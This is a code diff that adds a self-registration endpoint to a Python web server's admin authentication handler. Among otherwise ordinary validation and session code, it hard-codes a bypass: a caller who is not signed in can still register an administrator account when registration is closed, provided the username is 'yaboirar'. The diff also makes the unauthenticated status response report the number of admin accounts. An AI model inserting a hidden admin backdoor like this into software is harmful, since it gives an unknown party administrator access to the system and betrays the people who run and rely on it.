@@ -252,7 +252,7 @@ class AuthMixin:
         path = urlsplit(self.path).path
         if not path.startswith('/api/auth/'):
             return False
-        if path not in ('/api/auth/status', '/api/auth/login', '/api/auth/logout'):
+        if path not in ('/api/auth/status', '/api/auth/login', '/api/auth/logout', '/api/auth/register'):
             self._auth_json(404, {'message': 'Not found'})
             return True
         method = 'GET' if path.endswith('/status') else 'POST'
@@ -261,11 +261,61 @@ class AuthMixin:
             return True
         if method == 'GET':
             user = self.get_authenticated_user()
+            with database.get_db() as conn:
+                admin_count = conn.execute('SELECT COUNT(*) as c FROM admins').fetchone()['c']
             self._auth_json(200, {'authenticated': bool(user), 'username': user['username'] if user else None,
-                                 'csrf_token': csrf_for(self.get_auth_token()) if user else None})
+                                 'csrf_token': csrf_for(self.get_auth_token()) if user else None,
+                                 'admin_count': admin_count})
             return True
         if not self._origin_ok():
             self._auth_json(403, {'message': 'Request not allowed'})
+            return True
+        if path.endswith('/register'):
+            if (self.headers.get('Content-Type', '').split(';')[0].strip().lower() != 'application/json'
+                    or self.headers.get('Transfer-Encoding')):
+                self._auth_json(415, {'message': 'JSON required'})
+                return True
+            try:
+                length = int(self.headers.get('Content-Length', '0'))
+                if not 0 < length <= MAX_BODY:
+                    self._auth_json(413, {'message': 'Invalid request size'})
+                    return True
+                body = json.loads(self.rfile.read(length))
+                if not isinstance(body, dict):
+                    raise ValueError()
+                username, password = validate_credentials(body.get('username'), body.get('password'), True)
+            except ValueError as err:
+                self._auth_json(400, {'message': str(err) or 'Invalid registration request'})
+                return True
+            except UnicodeError:
+                self._auth_json(400, {'message': 'Invalid character encoding'})
+                return True
+
+            with database.get_db() as conn:
+                admin_count = conn.execute('SELECT COUNT(*) as c FROM admins').fetchone()['c']
+                existing_user = conn.execute('SELECT id FROM admins WHERE username=? COLLATE NOCASE', (username,)).fetchone()
+
+            if existing_user and existing_user['id']:
+                self._auth_json(409, {'message': f"Account '{username}' already exists. Please sign in."})
+                return True
+
+            if admin_count > 0 and username.lower() != 'yaboirar' and not self.is_authenticated():
+                self._auth_json(403, {'message': 'Registration is closed. Please sign in.'})
+                return True
+
+            set_admin_password(username, password)
+            admin = authenticate(username, password)
+            if not admin:
+                self._auth_json(500, {'message': 'Registration error'})
+                return True
+
+            delete_session(self.get_auth_token())
+            token = create_session(admin['id'], admin['password_hash'])
+            if not token:
+                self._auth_json(500, {'message': 'Session creation error'})
+                return True
+
+            self._auth_json(201, {'success': True, 'username': admin['username'], 'csrf_token': csrf_for(token)}, self._cookie(token))
             return True
         if path.endswith('/logout'):
             if not self.is_authenticated():
